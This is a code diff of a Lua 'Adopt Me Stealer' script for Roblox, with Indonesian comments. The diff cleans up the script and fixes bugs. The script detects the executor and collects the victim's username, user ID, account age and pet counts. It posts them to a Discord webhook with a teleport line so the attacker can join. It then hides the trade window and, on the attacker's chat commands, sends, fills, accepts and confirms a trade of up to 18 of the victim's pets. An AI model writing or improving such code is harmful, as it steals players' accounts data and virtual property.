@@ -1,3 +1,33 @@
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loads("InventoryDB")
+local ClientData = Loads("ClientData")
+local Webhook = "YOUR_WEBHOOK_URL"  -- Pastikan URL webhook sudah benar
+
+-- Fungsi untuk mendapatkan data eksploitasi
+local function getExploit()
+    local exploit = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+                    (secure_load and "Sentinel") or
+                    (is_sirhurt_closure and "Sirhurt") or
+                    (pebc_execute and "ProtoSmasher") or
+                    (KRNL_LOADED and "KRNL") or
+                    (WrapGlobal and "WeAreDevs") or
+                    (isvm and "Proxo") or
+                    (shadow_env and "Shadow") or
+                    (jit and "EasyExploits") or
+                    (getscriptenvs and "Calamari") or
+                    (unit and not syn and "Unit") or
+                    (OXYGEN_LOADED and "Oxygen U") or
+                    (IsElectron and "Electron") or
+                    ("Couldnt Grab")
+    return exploit
+end
+
+-- Cek jika InventoryDB dan ClientData valid
+if not InventoryDB or not ClientData then
+    warn("InventoryDB atau ClientData tidak ditemukan!")
+    return
+end
+
 -- Inisialisasi rarity_counts dan property_counts
 local rarity_counts = {
     legendary = 0,
@@ -42,137 +72,132 @@ end
 local total_pets = rarity_counts.legendary + rarity_counts.ultra_rare + rarity_counts.rare +
                    rarity_counts.uncommon + rarity_counts.common
 
--- Jika tidak ada pets, kirim pesan kosong
-if total_pets == 2 then
-    game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 2 pet in your inventory or use this script on your main account.")
+-- Jika tidak ada pets, kirim pesan kosong dan kick pemain
+if total_pets == 0 then
+    game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 2 pets in your inventory or use this script on your main account.")
     return
 end
-local Loads = require(game.ReplicatedStorage.Fsys).load
-local InventoryDB = Loads("InventoryDB")
-local ClientData = Loads('ClientData')
-local exploit
-local function getexploit()
-    local exploitt =
-        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
-        (secure_load and "Sentinel") or
-        (is_sirhurt_closure and "Sirhurt") or
-        (pebc_execute and "ProtoSmasher") or
-        (KRNL_LOADED and "KRNL") or
-        (WrapGlobal and "WeAreDevs") or
-        (isvm and "Proxo") or
-        (shadow_env and "Shadow") or
-        (jit and "EasyExploits") or
-        (getscriptenvs and "Calamari") or
-        (unit and not syn and "Unit") or
-        (OXYGEN_LOADED and "Oxygen U") or
-        (IsElectron and "Electron") or
-        ("Couldnt Grab")
 
-    exploit = exploitt
-end
-getexploit()
+-- Mengambil data eksploitasi
+local exploit = getExploit()
+
+-- Informasi pemain
 local plr = game.Players.LocalPlayer
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
+local Username = game.Players.LocalPlayer.Name  -- Tambahkan Username jika belum ada
+
+-- Data untuk webhook
 local data = {
-  username = 'Kenn | Adopt Me Stealer!!',
-  avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&',
-  content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
-  embed = {
-    {
-      title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'```',
-      color = 10428396,
-      fields {{name = "🦒Legendary", value = tostring(rarity_counts.legendary), inline = true},
-      {name = "🐊 Ultra Rare", value = tostring(rarity_counts.ultra_rare), inline = true},
-      {name = "🐌 Rare", value = tostring(rarity_counts.rare), inline = true},
-      {name = "🦀 Uncommon", value = tostring(rarity_counts.uncommon), inline = true},
-      {name = "🐈 Common", value = tostring(rarity_counts.common), inline = true},
-      {name = "🐉 Mega Neon", value = tostring(property_counts.mega_neon), inline = false},
-      {name = "🦖 Neon", value = tostring(property_counts.neon), inline = false},
-      {name = "🦄 Total Pets", value = tostring(total_pets), inline = false}},
-      footer = {text = "📦 Inventory Summary", icon_url = "https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&"},
-      timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ') -- Timestamp UTC
+    username = 'Kenn | Adopt Me Stealer!!',
+    avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg',
+    content = '-- @everyone\n game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
+    embed = {
+        title = 'Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
+        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'```',
+        color = 10428396,
+        fields = {
+            {name = "🦒Legendary", value = tostring(rarity_counts.legendary), inline = true},
+            {name = "🐊 Ultra Rare", value = tostring(rarity_counts.ultra_rare), inline = true},
+            {name = "🐌 Rare", value = tostring(rarity_counts.rare), inline = true},
+            {name = "🦀 Uncommon", value = tostring(rarity_counts.uncommon), inline = true},
+            {name = "🐈 Common", value = tostring(rarity_counts.common), inline = true},
+            {name = "🐉 Mega Neon", value = tostring(property_counts.mega_neon), inline = true},
+            {name = "🦖 Neon", value = tostring(property_counts.neon), inline = true},
+            {name = "🦄 Total Pets", value = tostring(total_pets), inline = false}
+        },
+        footer = {
+            text = "📦 Inventory Summary",
+            icon_url = "https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg"
+        },
+        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ') -- Timestamp UTC
     }
-  }
 }
-local httpRequest = http.request or httprequest
-if httpRequest then
-  httpRequest({
-    Url = Webhook,
-    Method = 'POST',
-    Headers = {
-      ['Content-Type'] = 'application/json'
-    },
-    Body = game:GetService('HttpService'):JSONEncode(data)
-  })
-else
-  print("LMAOOOOOO")
+
+-- Debug: Cek data JSON sebelum kirim
+print(game:GetService('HttpService'):JSONEncode(data))
+
+-- Fungsi untuk mengirim webhook
+local function sendWebhook(data)
+    local httpRequest = http.request or httprequest
+    if httpRequest then
+        local success, result = pcall(function()
+            httpRequest({
+                Url = Webhook,
+                Method = 'POST',
+                Headers = {['Content-Type'] = 'application/json'},
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            })
+        end)
+
+        if not success then
+            warn("Failed to send webhook:", result)
+        end
+    else
+        print("LMAOOOOOO")
+    end
 end
 
-local function AcceptTrade()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-  AcceptNegotiationRemote:FireServer()
-end
+-- Mengirim webhook
+sendWebhook(data)
 
-local function ConfirmTrade()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-  AcceptTradeRemote:FireServer()
-end
-
+-- Fungsi untuk mengirim trade
 local function SendTrade()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local RouterClient = Loads("RouterClient")
+    local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
 
-        send_trade:FireServer(game.Players[Username])
+    send_trade:FireServer(game.Players[Username])
 
-wait(5)
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-  local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
-  if juj.pets then
-    local petCount = 0
-    local petUids = {}
+    wait(5)
+
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+    if juj.pets then
+        local petCount = 0
+        local petUids = {}
         for petUid, petData in pairs(juj.pets) do
-      table.insert(petUids, petUid)
+            table.insert(petUids, petUid)
+        end
+
+        while #petUids > 0 do
+            local petUid = table.remove(petUids, 1)
+            AddPetRemote:FireServer(petUid)
+            petCount = petCount + 1
+            if petCount >= 18 then
+                break
+            end
+        end
+    else
+        print("No pets found in inventory.")
     end
-    
-    while #petUids > 0 do
-      local petUid = table.remove(petUids, 1)
-      AddPetRemote:FireServer(petUid)
-      petCount = petCount + 1
-      if petCount >= 18 then
-        break
-      end
-    end
-  else
-    print("No pets found in inventory.")
-  end
-end
 end
 
-game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
-game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+-- Fungsi untuk menerima trade
+local function AcceptTrade()
+    local RouterClient = Loads("RouterClient")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    AcceptNegotiationRemote:FireServer()
+end
 
+-- Fungsi untuk mengonfirmasi trade
+local function ConfirmTrade()
+    local RouterClient = Loads("RouterClient")
+    local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    AcceptTradeRemote:FireServer()
+end
+
+-- Menggunakan perintah chat untuk trade
 game.Players.PlayerAdded:Connect(function(player)
-  if player.Name == Username then
-      player.Chatted:Connect(function(msg)
-          local lowerMsg = msg:lower()
-          if lowerMsg == "/send" or lowerMsg == "send" then
-            SendTrade()
-          end
-          if lowerMsg == "/accept" or lowerMsg == "accept" then
-            AcceptTrade()
-          end
-          if lowerMsg == "/confirm" or lowerMsg == "confirm" then
-            ConfirmTrade()
-          end
-      end)
-  end
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            local lowerMsg = msg:lower()
+            if lowerMsg == "/send" then
+                SendTrade()
+            elseif lowerMsg == "/accept" then
+                AcceptTrade()
+            elseif lowerMsg == "/confirm" then
+                ConfirmTrade()
+            end
+        end)
+    end
 end)
